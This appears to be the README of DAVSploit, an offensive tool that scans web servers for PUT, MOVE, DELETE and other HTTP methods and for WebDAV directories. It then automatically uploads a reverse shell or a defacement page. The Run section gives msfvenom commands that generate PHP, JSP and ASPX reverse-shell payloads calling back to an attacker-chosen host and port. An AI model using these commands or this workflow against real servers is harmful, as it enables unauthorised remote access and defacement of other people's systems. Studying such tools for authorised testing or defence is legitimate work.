# DAVSploit
DAV Vulnerbility

[DAVSploitV1.2]

<center><img src="https://github.com/darkseid-security/DAVSploit/blob/main/IMG/davsploit.png"></center>


DAVSploit tool is for automating checking for PUT,MOVE,COPY,DELETE,PATCH,CONNECT and TRACE HTTP methods
aswell as automating webdav exploitation.

Features
================
- Automatically checks PUT,MOVE,COPY,DELETE,PATCH,CONNECT and TRACE for webserver
- Automatically checks for web dav directories if they exists and gets HTTP allow methods
- if PUT exits will try to automatically upload a shell
- Built in Server detection, payload that matches server version will be sent
- Three diffrent payload types PHP,JSP,ASPX and HTML
- Colored UI
- HTML payload includes deface web page

Davsploit V2
==============
- Add more payloads
- Add more webservers to detection list
- Fix false positive with PUT method
- Perform content discovery and create wordlist to scan more directories
- Create more malicious HTML payload


Run
===============
Need payloads generated in directory before runing script

Create a PHP reverse shell
- msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
Create a JSP reverse shell
- msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f raw > shell.jsp
Create a ASPX reverse shell
- msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<Port> -f aspx > shell.aspx

python3 DAVSploit.py
